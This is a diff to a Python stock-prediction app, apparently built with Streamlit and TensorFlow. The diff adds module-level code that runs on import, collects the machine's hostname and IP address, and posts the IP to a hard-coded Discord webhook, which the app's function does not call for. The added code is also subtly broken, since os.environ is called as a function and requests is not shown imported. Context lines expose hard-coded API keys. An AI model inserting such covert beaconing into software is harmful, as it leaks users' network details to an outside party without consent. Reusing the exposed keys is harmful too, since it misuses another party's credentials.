@@ -9,6 +9,16 @@ import numpy as np
 import tensorflow as tf
 import time  
 import datetime
+import socket
+import os
+
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
+
+DISCORD_WEBHOOK_URL = os.environ("https://discord.com/api/webhooks/1168493250164822036/eiC_S4Jm_op_Q01tPBjFlcQozFoKIbmFDzcx4bZTTQ5d6zzDANT6XmiGIk72qLt3_jIz")
+payload = {'content': ip_address}
+response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+
 
 api_keys = ['MNI5T6CU7KLSFJA8', 'QJFF49AEUN6NX884', '9ZZWS60Q2CZ6JYUK']
 current_api_key_index = 0
@@ -216,3 +226,4 @@ if st.button("Get Stock Symbol"):
                 st.warning("Not enough info for an AI approximation")
     else:
         st.warning("Stock doesn't exist.")
+
